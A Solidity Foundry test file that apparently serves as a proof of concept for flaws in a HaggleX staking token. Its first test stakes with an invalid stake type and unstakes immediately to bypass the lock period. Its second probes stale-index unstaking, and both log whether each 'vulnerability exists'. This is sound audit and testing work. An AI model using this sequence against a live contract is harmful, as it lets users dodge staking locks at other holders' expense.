// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/HaggleToken.sol";

contract HaggleXTokenTest is Test {
    HaggleXToken token;
    address alice = address(1);
    uint256 constant STAKE_AMOUNT = 10 ether;
    uint256 constant SHORT_STAKE_TYPE = 9; // Valid stake type with lock period
    uint256 constant INVALID_STAKE_TYPE = 3; // Unknown stake type
    uint256 constant LOCK_DURATION = 20 minutes + 1 seconds; // Including margin

    function setUp() public {
        token = new HaggleXToken();
        token.mint(alice, 100 ether);
    }

    function test_invalid_staketype_allows_immediate_unstake() public {
        // Get initial state
        uint256 initialBalance = token.balanceOf(alice);
        vm.startPrank(alice);
        uint256 initialStakesCount = token.getStakes().length;
        vm.stopPrank();
        
        console.log("--- BEFORE-Trigger Stake ---");
        console.log("Alice initial balance:", initialBalance);
        console.log("Alice initial stakes count:", initialStakesCount);
        
        // Execute attack sequence
        vm.startPrank(alice);
        token.stake(STAKE_AMOUNT, INVALID_STAKE_TYPE);
        
        // After stake state
        uint256 afterStakeBalance = token.balanceOf(alice);
        uint256 afterStakeStakesCount = token.getStakes().length;
        
        console.log("--- AFTER Stake (BEFORE Unstake) ---");
        console.log("Alice after stake balance:", afterStakeBalance);
        console.log("Alice after stake stakes count:", afterStakeStakesCount);
        
        // Immediate unstake
        console.log("--- Trigger Unstake ---");
        token.unstake(0);
        vm.stopPrank();
        
        // Final state
        uint256 finalBalance = token.balanceOf(alice);
        vm.startPrank(alice);
        uint256 finalStakesCount = token.getStakes().length;
        vm.stopPrank();
        
        console.log("--- AFTER Trigger Unstake ---");
        console.log("Alice final balance:", finalBalance);
        console.log("Alice final stakes count:", finalStakesCount);
        
        // Vulnerability verification
        bool vulnerabilityExists = (finalBalance == initialBalance) && 
                                  (finalStakesCount == initialStakesCount);
        
        if(vulnerabilityExists) {
            console.log("Vulnerability Exists: Allowed immediate unstake of invalid stake type");
        } else {
            console.log("Vulnerability not Exist: Contract prevented invalid stake manipulation");
        }
        
        // Ensure assertions match validation
        assertEq(finalBalance, initialBalance, "Tokens not recovered after unstake");
        assertEq(finalStakesCount, initialStakesCount, "Stakes count not reset after unstake");
    }

    function test_unstake_invalid_index_after_shift() public {
        // Initial setup
        uint256 initialBalance = token.balanceOf(alice);
        vm.startPrank(alice);
        
        // Create valid stakes
        token.stake(STAKE_AMOUNT, SHORT_STAKE_TYPE);
        token.stake(STAKE_AMOUNT, SHORT_STAKE_TYPE);
        
        // Fast-forward beyond lock period
        vm.warp(block.timestamp + LOCK_DURATION);
        
        // Remove first stake
        token.unstake(0);
        vm.stopPrank();
        
        // Prepare for invalid unstake attempt
        vm.startPrank(alice);
        uint256 preInvalidUnstakeBalance = token.balanceOf(alice);
        uint256 preInvalidUnstakeStakesCount = token.getStakes().length;
        vm.stopPrank();
        
        console.log("--- BEFORE-Trigger Invalid Unstake ---");
        console.log("Alice balance before invalid unstake:", preInvalidUnstakeBalance);
        console.log("Alice stakes count before invalid unstake:", preInvalidUnstakeStakesCount);
        
        // Attempt invalid unstake
        vm.expectRevert();
        vm.prank(alice);
        console.log("--- Trigger Invalid Unstake (index 1) ---");
        token.unstake(1);
        
        // Final state
        vm.startPrank(alice);
        uint256 postInvalidUnstakeBalance = token.balanceOf(alice);
        uint256 postInvalidUnstakeStakesCount = token.getStakes().length;
        vm.stopPrank();
        
        console.log("--- AFTER-Trigger Invalid Unstake ---");
        console.log("Alice balance after invalid unstake:", postInvalidUnstakeBalance);
        console.log("Alice stakes count after invalid unstake:", postInvalidUnstakeStakesCount);
        
        // Vulnerability verification
        bool stateChanged = (preInvalidUnstakeBalance != postInvalidUnstakeBalance) ||
                           (preInvalidUnstakeStakesCount != postInvalidUnstakeStakesCount);
        
        if(stateChanged) {
            console.log("Vulnerability Exists: State changed during invalid unstake attempt");
        } else {
            console.log("Vulnerability not Exist: Contract prevented invalid unstake operation");
        }
        
        // Final assertions
        assertEq(postInvalidUnstakeBalance, initialBalance - STAKE_AMOUNT, 
                "Balance affected by failed unstake");
    }
}